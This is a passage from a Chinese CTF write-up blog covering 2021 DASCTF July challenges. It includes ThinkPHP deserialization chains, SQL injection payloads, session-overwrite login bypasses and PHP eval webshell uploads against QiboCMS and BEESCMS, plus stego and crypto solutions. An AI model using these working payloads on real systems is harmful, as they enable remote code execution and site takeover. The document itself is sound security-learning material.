不过后台上传貌似不行，sql 执行开启了 --secure-file-priv，不能写入文件。 打法1 前台反序列化 RCE这里复现，主要参考 齐博建站系统x1.0代码审计 有一处前台反序列化的地方 application\\index\\controller\\Labelmodels.php 直接拿文章里面的现成 exp 来打了。 &lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-&gt;files = [$files]; //$file =&gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-&gt;parent = $output; //$this-&gt;parent=&gt; think\\console\\Output; $this-&gt;append = array(\"xxx\"=&gt;\"getError\"); //调用getError 返回this-&gt;error $this-&gt;error = $modelRelation; // $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$query指向Query $this-&gt;bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-&gt;styles = ['getAttr']; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-&gt;options=[ 'expire' =&gt; 3600, 'cache_subdir' =&gt; false, 'prefix' =&gt; '', 'path' =&gt; 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php', 'data_compress' =&gt; false, ]; $this-&gt;tag = 'xxx'; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 看起来已经走过反序列化这条语句了，执行成功了。 木马的文件名是 a.php 加上 var_dump(md5('tag_'.md5('xxx'))); 的结果，也就是 a.php12ac95f1498ce51d2d96a249c09c1998.php 然而直接访问根目录下的这个文件 404 了…… 后来发现是根目录下 www-data 用户没有写入权限，子目录下才有。 （其实是在打法2才发现的 2333 改一改 payload，写入到 runtime 目录下。记得改长度。 http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 生成的木马在 /runtime/a.php12ac95f1498ce51d2d96a249c09c1998.php，密码 ccc 打法2 升级日志 RCE参考 Y4tacker 师傅的 [代码审计]齐博建站系统x1.0企业版代码审计 （Orz application/admin/controller/Upgrade.php下的 sysup 函数在写入升级日志时直接拼接了 GET 参数中的 upgrade_edition，且写入的文件后缀为 .php 构造 payload \",\"\"=&gt;eval($_POST[%27miao%27])-\"// 原文中的是 \",\"\"=&gt;-eval($_POST[%27yyds%27])-\",];?&gt;// http://xxxxx/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3Eeval($_POST[%27miao%27])-%22// 在 http://xxx/runtime/client_upgrade_edition.php 生成了一句话木马。 拼接后的文件内容为 &lt;?php return [\"md5\"=&gt;\"\",\"\"=&gt;eval($_POST['miao'])-\"//\",\"time\"=&gt;\"2021-08-03 17:31\",]; 其实寻思着 payload 改成下面这个更好，拼接字符串不会报 warning 23333. \",\"\"=&gt;eval($_POST[%27miao%27]).\"// 安全,安全,还是xxx的安全 某个特别安全的商店 Hint: CREATE TABLE \"users\" ( \"id\" INTEGER NOT NULL, \"username\" TEXT UNIQUE , \"login_password\" text, \"money\" INTEGER, \"pay_password\" TEXT, \"flag_num\" INTEGER, PRIMARY KEY (\"id\") ); CREATE TABLE \"flaaaaaaaaag\" ( \"flllllllag\" TEXT ); 是个零解题。 根据给的 hint 可以知道是要 SQL 注入。 本来以为注入点在 购买 这里的 flag 数量上，然而并没有找到回显点，而且返回错误 Hacker 了。 参考 erR0Ratao 师傅的 wp，注入点在注册功能的 pay_password 处。 var app = new Vue({ el: '#app', data() { return { users: { username: '', password: '', pay_password: '' }, rules: { username: [ {required: true, message: '请输入用户名', trigger: 'blur'}, {min: 3, max: 32, message: '长度在 3 到 32 个字符', trigger: 'blur'} ], password: [{required: true, message: '请输入登录密码', trigger: 'blur'}], pay_password: [{required: true, message: '请输入支付密码', trigger: 'blur'}] }, visibility: \"visibility: hidden\" } }, methods: { onSubmit() { axios .post('register', { username: app.users.username, password: md5(app.users.password+\"CBCTF\"), pay_password: encrsa(app.users.pay_password) }) .then(response =&gt; { if (response.data.error) { if (response.data.msg === \"hacker!\") { this.visibility = \"visibility: visible\"; } else { this.visibility = \"visibility: hidden\"; } app.$message({ showClose: true, message: response.data.msg, type: 'error' }); } else { window.location.href = 'login' } }) .catch(function (error) { // 请求失败处理 console.log(error); }); }, } }); function encrsa(input) { const crypt = new JSEncrypt(); const pub_key = \"-----BEGIN PUBLIC KEY-----\\n\" + \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\\n\" + \"3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\\n\" + \"AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\\n\" + \"UGzrDiFb40I47X6oRQIDAQAB\\n\" + \"-----END PUBLIC KEY-----\" crypt.setPublicKey(pub_key); return crypt.encrypt(md5(input+\"CBCTF2021\")) } 根据前端源码，对支付密码进行了 md5 =&gt; rsa =&gt; base64 的加密。 直接注入发现注不进去，考虑到有可能后端存的就是支付密码的 md5 结果，于是可以改一改这个 encrsa 函数，在 md5 之后、RSA 之前进行注入。 根据 hint，pay_password 后面还有一个 flag_num 字段，构造 payload 为 0a8b5a33639258fd9476bb66d3b7202d',233)-- 登录之后可以发现改成功了。 于是再构造 0a8b5a33639258fd9476bb66d3b7202d',hex((select flllllllag from flaaaaaaaaag)))-- 直接用浏览器在注册页面执行下面的 js 代码。 function encrsa(input) { const crypt = new JSEncrypt(); const pub_key = \"-----BEGIN PUBLIC KEY-----\\n\" + \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\\n\" + \"3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\\n\" + \"AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\\n\" + \"UGzrDiFb40I47X6oRQIDAQAB\\n\" + \"-----END PUBLIC KEY-----\" crypt.setPublicKey(pub_key); return crypt.encrypt(\"0a8b5a33639258fd9476bb66d3b7202d',\" + input + \")--\"); } axios .post('register', { username: \"miao\", password: md5(\"miao\" + \"CBCTF\"), // pay_password: encrsa(\"233\") // 在这里注入 pay_password: encrsa(\"hex((select flllllllag from flaaaaaaaaag))\") // 在这里注入 }) .then(response =&gt; { if (response.data.error) { if (response.data.msg === \"hacker!\") { this.visibility = \"visibility: visible\"; } else { this.visibility = \"visibility: hidden\"; } app.$message({ showClose: true, message: response.data.msg, type: 'error' }); } else { window.location.href = 'login' } }) .catch(function (error) { // 请求失败处理 console.log(error); }); 然后 hex 解码一下就完事了。 另外，可以根据数据库版本的语句来判断数据库类型： Mysql version()、Sqlserver @@VERSION、Sqlite sqlite_version() 提示 hacker 可能是后端执行出错了，而 sqlite_version() 成功执行，说明是 sqlite，版本是 3.27.2。 唔，其实不用 hex 也可以的…… Miscred_vs_blue 红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？ 发现他这个记录在一个 session 里是固定不变的，写个脚本记录一下，错了重试就完事了。 （就是有点麻烦，脚本写的有点丑，还调了老半天……还是太菜了，唉 \"\"\" MiaoTony \"\"\" from pwn import * import re from time import sleep # context.log_level = 'debug' context.timeout = 10 # sh = remote('node4.buuoj.cn', 25451) sh = remote('117.21.200.166', 25451) choices = ['']*100 cnt = 0 c = 0 sh.recvuntil( 'To get the flag if you predict the results of all games successfully!\\n') retry = False while True: sh.recvuntil('Game ') n = int(sh.recvuntil('\\n').strip()) print('===&gt; n:', n) sh.recvuntil('choose one [r] Red Team,[b] Blue Team:\\n') choice = choices[n] if choice: retry = True else: choice = 'b' retry = False sh.sendline(choice) for _ in range(2): sh.recvline() x = sh.recvline().decode() # print('====&gt; x:', x) if 'successful' in x: c = re.findall(r'The number of successful predictions (\\d+)', x) c = int(c[0]) print('=====&gt; successful cnt:', c) cnt += 1 choices[n] = choice # if not retry: # choices += choice print('=====------------------&gt;&gt;&gt; choices:', ''.join(choices)) elif 'Sorry!You are wrong!' in x: sh.sendlineafter('Play again? (y/n): ', 'y') choice = 'b' if choice == 'r' else 'r' choices[n] = choice print('=====--------&gt;&gt;&gt; choices:', ''.join(choices)) cnt = 0 if cnt == 66: break # sleep(0.01) sh.interactive() 问卷题DASCTF{79f3bb47a2e2d46def82c052eccb7b80} ezSteganography又是开局一张图。 Red 0 有线索 Green 平面一看就有隐写 提取得到一张图 qim quantization 利用 VoIP 编码器的码本编码特性划分码本来隐藏信息的方法叫做量化索引调制QIM 隐写：按照语音编码本来的原则将码本以某种规则划分并选择次优参数来嵌入秘密信息。 参考了 GitHub 上的 QuantizationIndexModulation 稍微改了一下 \"\"\"Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005\"\"\" from __future__ import print_function import sys import os # HOME = os.environ[\"HOME\"] import numpy as np from PIL import Image import matplotlib.pyplot as plt class QIM: def __init__(self, delta): self.delta = delta def embed(self, x, m): \"\"\" x is a vector of values to be quantized individually m is a binary vector of bits to be embeded returns: a quantized vector y \"\"\" x = x.astype(float) d = self.delta y = np.round(x/d) * d + (-1)**(m+1) * d/4. return y def detect(self, z): \"\"\" z is the received vector, potentially modified returns: a detected vector z_detected and a detected message m_detected \"\"\" shape = z.shape z = z.flatten() m_detected = np.zeros_like(z, dtype=float) z_detected = np.zeros_like(z, dtype=float) z0 = self.embed(z, 0) z1 = self.embed(z, 1) d0 = np.abs(z - z0) d1 = np.abs(z - z1) gen = zip(range(len(z_detected)), d0, d1) for i, dd0, dd1 in gen: if dd0 &lt; dd1: m_detected[i] = 0 z_detected[i] = z0[i] else: m_detected[i] = 1 z_detected[i] = z1[i] z_detected = z_detected.reshape(shape) m_detected = m_detected.reshape(shape) return z_detected, m_detected.astype(int) def random_msg(self, l): \"\"\" returns: a random binary sequence of length l \"\"\" return np.random.choice((0, 1), l) def get_flag(): delta = 20 # quantization step qim = QIM(delta) img = Image.open('ezSteganography-flag.png') img = np.array(img) # plt.imshow(img) # plt.show() print(img.shape) # (1440, 2560, 3) R, G, B = img[:, :, 0], img[:, :, 1], img[:, :, 2] z_detected, msg_detected = qim.detect(G) # plt.imshow(z_detected) plt.imshow(msg_detected) plt.show() def main(): get_flag() if __name__ == \"__main__\": sys.exit(main()) Nuclear wastewater 小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。 ![Nuclear wastewater](CTF_2021DASCTF_July/Nuclear wastewater.png) 写个脚本提取出每个像素的颜色，可以发现 rgb 中只有一个通道有数值。 chr 读一下。 from typing import Counter from PIL import Image img = Image.open('Nuclear wastewater.png') print(img.size) # (230, 230) w, h = img.size data = [] for i in range(0, w): for j in range(0, h): r, g, b = img.getpixel((i, j)) if (r, g, b) == (255, 255, 255): continue else: # print(r, g, b) for x in (r, g, b): if x != 0: data.append(chr(x)) # print(''.join(data)) r = Counter(data) info = r.most_common() print(''.join([x[0] for x in info])) # theKEYis:#R@/&amp;p~!(\u001a?£ñ$\u0004ªVJÞÍFjÀ\u0016È÷¢©¼§U\u0015Ì¦õ±·ðäôÉ\u000eCS2Ú\u0010HÏ&gt;Á\u0013 得到压缩包密码 #R@/&amp;p~!，里面内容为 ‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‌‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‍‍‍‎‌‌‌‌‌‌‌‌‍‎‎‍‌‍‍‌‌‌‍‍‎‎‌‌‌‌‌‌‌‌‍‎‍‍‌‌‌‌‌‌‌‍‎‎‌‌‍‌‎‎‎‍‌‌‍‌‍‌‌‎‎‍‎‌‌‎‌‌‍‍‌‌‍‎‍‌‍‍‌‍‌‎‌‌‎‌‌‍‍‌‍‍‌‍‎‎‎‎‎‍‌‍‌‍‌‍‎‍‍‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‌‎‎‌‌‌‌‌‌‍‍‌‎‌‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‌‎‍‌‎‌‌‍‌‍‍‍‎‍‎‍‎‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‎‍‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‌‌‍‌‌‌‍‌‍‎‍‌‌‍‎‎OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI‌‍‌‌‌‍‍‌‎‌‍‌‍‌‌‌‍‌‎‎‎‍‌‍‎‎‌‌‍‎‍‌‎ 可以发现有零宽字符隐写，包含了 200c 200d 200e http://330k.github.io/misc_tools/unicode_steganography.html Citrix CTX1 decode CryptoYusa的密码学签到——BlockTrick题目源码 from Crypto.Cipher import AES import os def pad(a): size = (16-len(a)%16)%16 a += chr(size)*size return a iv = os.urandom(16) key = os.urandom(16) enc = AES.new(key,AES.MODE_CBC,iv) print(iv.encode('hex')) for _ in range(2): try: trick = raw_input(\"\") trick = pad(trick.decode('hex')) cipher = enc.encrypt(trick) if trick == cipher and trick != \"\" : with open(\"flag.txt\") as f: print(f.read()) exit() else: print(cipher.encode('hex')) print(\"Try again\") except: exit() AES MODE_CBC，需要加密前后的结果相同且不为空。可以参考 CBC 的原理框图。 这里就是两轮 CBC，只需要把发过来的再返回去两次就完事了。 原理大概是，第一次将初始向量 IV 与自己进行异或，得到一组零向量，把经过 CBC 后得到的 cipher 再与本身异或也是得到零向量，而这个加密器可以看作一种输入到输出的映射，对于同样的零向量输入，结果就一样了。 小结这篇写得好累啊…… 其实还是挺有味道的，学到了不少。 喵喵是 fw，喵呜呜呜（ （溜了溜了喵","path":"2021/08/15/CTF_2021DASCTF_July/"},{"title":"CTF | 2021 DASCTF July cybercms 一探再探","text":"本文首发于安全客：https://www.anquanke.com/post/id/250048 引言在前不久结束的 2021 DASCTF July X CBCTF 4th 比赛中，有一道名为 cybercms 的 web 题目。 预期解是从后台登录处进行 SQL 注入写入一句话木马，然而咱在做题的时候尝试了另一种思路，用的是后台登录绕过 &amp; 木马上传的打法。 由于比赛的时候半天打不通就十分难受，赛后还是想不明白就来稍微深入探究了一下，经过曲折最后终于成功打通了。 这篇就来记录一下做这道题时候的心路历程吧…… 题目初探 cybercms 赛博CMS，只为安全而生 Hint: 信息搜集是一个web手必备的技能 很好，是 BEESCMS，head 里的 description 没改，正文里其实也没改完。 从官网找到了 官方 V4.0 源码下载 （不过貌似没啥用 后来发现还是有用的 后台登录绕过 &amp; 上传参考 【代码审计】 beescms 变量覆盖漏洞导致后台登陆绕过分析，$_SESSION 可以被任意覆盖。 POST / _SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999 然后直接可以访问后台了。 http://xxxxxxxxxxx/admin/admin.php 参考 代码审计就该这么来3 beescms getshell 按照文中的思路，上传一个后缀为 .php 的一句话木马，并修改 Content-Type: image/png 来通过后端对文件类型的校验。 然而发现他文件目录没权限上传啊，随便上传一个正常的图片也是如此…… 源码泄露麻了，做到一半才发现有 源码泄露，/www.zip… diff 大法好啊，看来官方源码还是有用的 2333。 多了个 hackable/ 目录，看起来只有这个目录可写的样子。（虽然最后发现也不行 登录还过滤了一下 SQL 注入。 注意的是还把 /* * 的过滤给去掉了。 上传点源码审计再来看上传部分的源码。 审了一波源码，发现其实可以 构造目录穿越。 $up_file_name2 由 $pic_alt 而来，这个是可控的，只需要构造个目录穿越到 hackable 目录下就完事了。 为了进到这里，上传的时候记得再把 Content-Type: image/png 改好， is_alt 设为 1。 然而还是没打通，报错和上面的类似，也是 PHP 执行的时候文件目录没权限，只不过可以注意到文件名是 .php 了。 （咱也不知道为啥他 $pic_alt 没传进来，留空的话也不是随机数，一脸懵逼 另一个上传点审计于是么得办法，再挖了另一个文件上传的点，考虑通过 修改已上传图片的接口 来进行上传。 相应源码如下。 这里的 $pic_path 和 $pic_name 都是可控的，任意改一个就完事了。当然这是 PHP/5.6.40，%00 截断不可行 2333. 然而还是打不通…… 绝绝子，挖了两条上传的路，试着绕到 hackable 目录也打不通…… 看来还是文件目录的限制吧。 心态炸了啊啊啊啊啊。 SQL 注入写马（预期解）害，赛后看了看大佬的 wp，么得办法，还是得走 SQL 注入写入文件呗。（佛了 再来看上面 diff 出来的关于 SQL 注入的语句。 function fl_value($str){ if(empty($str)){return;} return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file |outfile/i','',$str); } define('INC_BEES','B'.'EE'.'SCMS'); function fl_html($str){ return htmlspecialchars($str); } function f1_vvv($str){ if(empty($str)){return;} if(preg_match(\"/\\ /i\", $str)){ exit('Go away,bad hacker!!'); } preg_replace('/0x/i','',$str); return $str; } 过滤了空格，倒是把 /* 过滤去掉了，另外把一些关键词过滤为空了，双写绕过就完事了。 根据代码里登录的 SQL 语句 $rel=$GLOBALS['mysql']-&gt;fetch_asc(\"select id,admin_name,admin_password,admin_purview,is_disable from \".DB_PRE.\"admin where admin_name='\".$user.\"' limit 0,1\"); 构造 SQL # select xxx into outfile xxx # &lt;?php eval($_REQUEST['m']);?&gt; admin'/**/uni union on/**/seselectlect/**/null,null,null,null,0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e/**/in in to/**/outoutfilefile/**/'/var/www/html/upload/miao.php'# （咱也不知道为啥 0x 没被过滤为空，双写 0x 发现并没有被删除反而 SQL 执行报错了 Payload: POST /admin/login.php?action=ck_login HTTP/1.1 user=admin%27%2F%2A%2A%2Funi%20union%20on%2F%2A%2A%2Fseselectlect%2F%2A%2A%2Fnull%2Cnull%2Cnull%2Cnull%2C0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e%2F%2A%2A%2Fin%20in%20to%2F%2A%2A%2Foutoutfilefile%2F%2A%2A%2F%27%2Fvar%2Fwww%2Fhtml%2Fupload%2Fmiao%2Ephp%27%23&amp;password=miao&amp;code=&amp;submit=true&amp;submit.x=43&amp;submit.y=24 当然也可以用 char 函数写入木马。 admin'/**/uni union on/**/seselectlect/**/null,null,null,null,char(60,63,112,104,112,32,101,118,97,108,40,36,95,82,69,81,85,69,83,84,91,39,109,39,93,41,59,63,62)/**/in in to/**/outoutfilefile/**/'/var/www/html/upload/miao.php'# 进去发现果然 MySQL 就是 root 用户起来的，于是就能写入文件。 而 PHP 运行在 www-data 用户，/var/www/html 目录是给 www-data 用户了，但子目录没递归变更属主也没给写入权限就离谱。 $ ps -ef PID USER TIME COMMAND 1 root 0:07 /bin/sh /usr/local/bin/docker-php-entrypoint 10 root 0:21 /usr/bin/mysqld --user=root --skip-name-resolve --skip-networking=0 54 root 0:02 php-fpm: master process (/usr/local/etc/php-fpm.conf) 60 root 0:00 nginx: master process nginx 61 nginx 0:00 nginx: worker process 62 www-data 0:00 php-fpm: pool www 63 www-data 0:01 php-fpm: pool www 19798 root 0:00 sleep 5s 19799 www-data 0:00 ps -ef 也有可能预期解就只有这条路可走吧。 气死了，下次直接 pyflag 算了（bushi 上传点再探噢对了，寻思着咱挖了两个上传点都整不通，实在过意不去啊。 既然前面发现了 www-data 用户只有 /var/html/www 这个路径有权限写入，子目录么有，那可以 传到这个网站的根目录 啊！ 这里用的是修改图片的接口，也就是上面说的 第二处上传点。 上传以后抓包修改几个地方，看图。 也就是让 move_uploaded_file 结果是移动到网站根目录下。 POST /admin/admin_pic.php?nav=pic_list&amp;admin_p_nav=content HTTP/1.1 Host: a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn Content-Length: 1546 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIZBj4kiaMbZzC9WL User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn/admin/admin_pic.php?action=edit_pic&amp;id=33&amp;nav=pic_list&amp;admin_p_nav=content Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=775sgdevoo6c222oonmf0qhp71 Connection: close ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"is_thumb\" 0 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"thumb_width\" 300 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"thumb_height\" 200 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_alt\" miao ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"new_pic\"; filename=\"cmd.php\" Content-Type: image/png &lt;?php @eval($_POST['cmd']);?&gt; ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"action\" save_edit ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_cate\" 1 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_path\" ./ ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_name\" 1 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic\" upload/img/202107070904261782.jpg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_ext\" jpg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"id\" 33 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_thumb\" img/202107070904261782_thumb.jpeg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"xg_category\" 确定 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL-- pic_path 留空也行。 呐，传上来了，能用了。 喵喵落泪（ 又想了想，寻思着是不是 iconv 的锅啊，上传经过这个函数时候东西都没了…… // 第一个上传点 // includes/fun.php#588-590 $up_file_name=empty($pic_alt)?date('YmdHis').rand(1,10000):$pic_alt; $up_file_name2=iconv('UTF-8','GBK',$up_file_name); $file_name=$path.$up_file_name2.'.'.$pic_name['extension']; // 第二个上传点 // admin/admin_pic.php#64-65 $pic_name=$_POST['pic_name'];//图片名称 $pic_name = iconv('UTF-8','GBK',$pic_name); phpinfo 看一眼。 好家伙，看起来是因为没 libiconv 或者 glibc，所以这里面东西就变成空了……没事了。 小结其实是一次因为想不通而开始的深入探究，唉，这题做起来不容易啊…… 